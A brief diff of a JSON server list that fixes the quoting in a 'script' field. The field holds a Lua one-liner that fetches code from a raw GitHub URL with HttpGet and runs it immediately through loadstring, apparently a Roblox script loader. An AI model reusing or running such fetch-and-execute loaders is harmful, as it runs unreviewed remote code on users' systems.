@@ -1,7 +1,7 @@
 [
 {
         "Server1": true,
-        "script": "loadstring(game:HttpGet("https://raw.githubusercontent.com/notarealskibidigyattri/server/refs/heads/main/loadstring"))()"
+        "script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/notarealskibidigyattri/server/refs/heads/main/loadstring'))()"
     },
     {
         "Server2": true,
